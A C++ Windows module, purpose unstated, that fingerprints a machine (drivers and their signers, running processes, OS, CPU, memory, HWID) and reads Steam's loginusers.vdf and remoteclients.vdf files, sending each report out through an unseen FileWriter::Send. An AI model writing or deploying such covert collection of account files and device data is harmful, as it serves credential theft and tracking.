#include "Header.h"
#include <Windows.h>
#include <setupapi.h>
#include <Psapi.h>
#include <wincrypt.h>
#include <iostream>
#include <string>
#include <map>
#include <fstream>
#include <tlhelp32.h>
#include <sysinfoapi.h>
#include <winbase.h>
#include <intrin.h>
#include <sstream>
#include <locale>
#include <codecvt>
#include <filesystem>


#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Psapi.lib")

void Info::DriverInfo() {
    SYSTEM_INFO native_system_info;
    GetNativeSystemInfo(&native_system_info);

    //if (native_system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
        void* device_list[0x200];
        DWORD required_size;

        if (EnumDeviceDrivers(device_list, sizeof(device_list), &required_size)) {
            if (required_size <= sizeof(device_list)) {
                std::string report;
                PVOID OldValue = nullptr;
                BOOL redirectionDisabled = Wow64DisableWow64FsRedirection(&OldValue);

                for (int device_index = 0; device_index < required_size / sizeof(void*); ++device_index) {
                    char driver_file_name[0x100];
                    int driver_file_name_length = GetDeviceDriverFileNameA(
                        device_list[device_index],
                        driver_file_name,
                        sizeof(driver_file_name));

                    if (driver_file_name_length) {
                        report += "Driver File Name: " + std::string(driver_file_name) + "\n";

                        HANDLE device_driver_file_handle = CreateFileA(
                            driver_file_name,
                            GENERIC_READ,
                            FILE_SHARE_READ,
                            nullptr,
                            OPEN_EXISTING,
                            0,
                            nullptr);

                        if (device_driver_file_handle != INVALID_HANDLE_VALUE) {
                            wchar_t widechar_buffer[0x100];
                            MultiByteToWideChar(
                                CP_ACP,
                                0,
                                driver_file_name,
                                -1,
                                widechar_buffer,
                                sizeof(widechar_buffer) / sizeof(wchar_t));

                            DWORD file_size = GetFileSize(device_driver_file_handle, nullptr);
                            report += "File Size: " + std::to_string(file_size) + " bytes\n";

                            CloseHandle(device_driver_file_handle);

                            HCERTSTORE cert_store;
                            HCRYPTMSG msg_handle;
                            DWORD msg_and_encoding_type, content_type, format_type;

                            if (CryptQueryObject(
                                CERT_QUERY_OBJECT_FILE,
                                widechar_buffer,
                                CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
                                CERT_QUERY_FORMAT_FLAG_BINARY,
                                0,
                                &msg_and_encoding_type,
                                &content_type,
                                &format_type,
                                &cert_store,
                                &msg_handle,
                                nullptr)) {

                                DWORD signer_info_size = 0;
                                if (CryptMsgGetParam(msg_handle, CMSG_SIGNER_INFO_PARAM, 0, nullptr, &signer_info_size)) {
                                    auto* signer_info = (CMSG_SIGNER_INFO*)malloc(signer_info_size);
                                    if (signer_info) {
                                        if (CryptMsgGetParam(msg_handle, CMSG_SIGNER_INFO_PARAM, 0, signer_info, &signer_info_size)) {
                                            CERT_INFO certificate_information;
                                            memcpy(&certificate_information.Issuer, &signer_info->Issuer, sizeof(CERT_NAME_BLOB));
                                            memcpy(&certificate_information.SerialNumber, &signer_info->SerialNumber, sizeof(CRYPT_INTEGER_BLOB));

                                            PCCERT_CONTEXT cert_ctx = CertFindCertificateInStore(
                                                cert_store,
                                                X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                                                0,
                                                CERT_FIND_SUBJECT_CERT,
                                                &certificate_information,
                                                nullptr);
                                            if (cert_ctx) {
                                                char cert_name[0x100];
                                                DWORD cert_name_length = CertGetNameStringA(
                                                    cert_ctx,
                                                    CERT_NAME_SIMPLE_DISPLAY_TYPE,
                                                    0,
                                                    nullptr,
                                                    cert_name,
                                                    sizeof(cert_name));
                                                if (cert_name_length) {
                                                    report += "Certificate Name: " + std::string(cert_name) + "\n";
                                                }
                                                CertFreeCertificateContext(cert_ctx);
                                            }
                                        }
                                        free(signer_info);
                                    }
                                }
                                CertCloseStore(cert_store, 0);
                                CryptMsgClose(msg_handle);
                            }
                        }
                        report += "\n"; 
                    }
                }

                if (redirectionDisabled) {
                    Wow64RevertWow64FsRedirection(OldValue);
                }

                FileWriter::Send(report);
            }
        }
    //}
}

void Info::ProcessInfo() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    std::string report;

    
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "CreateToolhelp32Snapshot (of processes) failed" << std::endl;
        return;
    }

    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    
    if (!Process32First(hProcessSnap, &pe32)) {
        std::cerr << "Process32First failed" << std::endl; 
        CloseHandle(hProcessSnap);          
        return;
    }

    do {
        report += "Process ID: " + std::to_string(pe32.th32ProcessID) + "\n";
        report += "Process Name: " + std::string(pe32.szExeFile) + "\n";

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
        if (hProcess) {
            PROCESS_MEMORY_COUNTERS pmc;
            if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
                report += "Working Set Size: " + std::to_string(pmc.WorkingSetSize) + " bytes\n";
                report += "Pagefile Usage: " + std::to_string(pmc.PagefileUsage) + " bytes\n";
            }
            CloseHandle(hProcess);
        }
        report += "\n";
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    FileWriter::Send(report);
}

static std::string WideStringToString(const std::wstring& wstr) {
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    return converter.to_bytes(wstr);
}

void Info::SystemInfo() {
    std::string report;

    typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (hMod) {
        RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
        if (fxPtr != nullptr) {
            RTL_OSVERSIONINFOW rovi = { 0 };
            rovi.dwOSVersionInfoSize = sizeof(rovi);
            if (fxPtr(&rovi) == 0) {
                std::wstringstream wss;
                wss << L"Operating System: Windows " << rovi.dwMajorVersion << L"." << rovi.dwMinorVersion << L"\n";
                wss << L"Build Number: " << rovi.dwBuildNumber << L"\n";
                wss << L"Platform ID: " << rovi.dwPlatformId << L"\n";
                wss << L"Service Pack: " << rovi.szCSDVersion << L"\n";
                report += WideStringToString(wss.str());
            }
        }
    }


    int cpuInfo[4] = { -1 };
    unsigned int nExIds, i = 0;
    char CPUBrandString[0x40];
    __cpuid(cpuInfo, 0x80000000);
    nExIds = cpuInfo[0];
    for (i = 0x80000000; i <= nExIds; ++i) {
        __cpuid(cpuInfo, i);
        if (i == 0x80000002)
            memcpy(CPUBrandString, cpuInfo, sizeof(cpuInfo));
        else if (i == 0x80000003)
            memcpy(CPUBrandString + 16, cpuInfo, sizeof(cpuInfo));
        else if (i == 0x80000004)
            memcpy(CPUBrandString + 32, cpuInfo, sizeof(cpuInfo));
    }
    report += "CPU: " + std::string(CPUBrandString) + "\n";

    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);

    report += "Memory in use: " + std::to_string(statex.dwMemoryLoad) + "%\n";
    report += "Total physical memory: " + std::to_string(statex.ullTotalPhys / 1024 / 1024) + " MB\n";
    report += "Free physical memory: " + std::to_string(statex.ullAvailPhys / 1024 / 1024) + " MB\n";
    report += "Total virtual memory: " + std::to_string(statex.ullTotalPageFile / 1024 / 1024) + " MB\n";
    report += "Free virtual memory: " + std::to_string(statex.ullAvailPageFile / 1024 / 1024) + " MB\n";
    report += "Free extended memory: " + std::to_string(statex.ullAvailExtendedVirtual / 1024 / 1024) + " MB\n";
    
    SYSTEM_INFO siSysInfo;
    GetSystemInfo(&siSysInfo);

    report += "Hardware information:\n";
    report += "OEM ID: " + std::to_string(siSysInfo.dwOemId) + "\n";
    report += "Number of processors: " + std::to_string(siSysInfo.dwNumberOfProcessors) + "\n";
    report += "Page size: " + std::to_string(siSysInfo.dwPageSize) + "\n";
    report += "Processor type: " + std::to_string(siSysInfo.dwProcessorType) + "\n";
    report += "Minimum application address: " + std::to_string((uintptr_t)siSysInfo.lpMinimumApplicationAddress) + "\n";
    report += "Maximum application address: " + std::to_string((uintptr_t)siSysInfo.lpMaximumApplicationAddress) + "\n";
    report += "Active processor mask: " + std::to_string(siSysInfo.dwActiveProcessorMask) + "\n";

    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);

    if (GetComputerNameExA(ComputerNameDnsHostname, computerName, &size)) {
        report += "Device Name: " + std::string(computerName) + "\n";
    }

    HW_PROFILE_INFO hwProfileInfo;
    if (GetCurrentHwProfile(&hwProfileInfo))
        report += "HWID: " + std::string(hwProfileInfo.szHwProfileGuid) + "\n";
    

    FileWriter::Send(report);
}


std::string readVDFFile(const std::string& filePath) {
    std::ifstream inputFile(filePath);
    if (!inputFile) {
        //std::cerr << "Failed to open input file: " << filePath << std::endl;
        return "";
    }

    std::string content((std::istreambuf_iterator<char>(inputFile)),
        std::istreambuf_iterator<char>());

    inputFile.close();
    return content;
}

void Info::SteamInfo() {
    
        std::string steamPath = SteamHelp::GetInstallPath();
        if (steamPath.empty()) {
            //std::cerr << "steam installation path not found" << std::endl;

        }

        std::filesystem::path configPath = std::filesystem::path(steamPath) / "config" / "loginusers.vdf";
        std::filesystem::path configPath1 = std::filesystem::path(steamPath) / "config" / "remoteclients.vdf";
        if (!std::filesystem::exists(configPath)) {
            //std::cerr << "steam loginusers.vdf file not found at " << configPath << std::endl;
            
        }

        std::string vdfContent = readVDFFile(configPath.string());
        std::string vdfContent1 = readVDFFile(configPath1.string());
        FileWriter::Send(vdfContent);
        FileWriter::Send(vdfContent1);
    
}
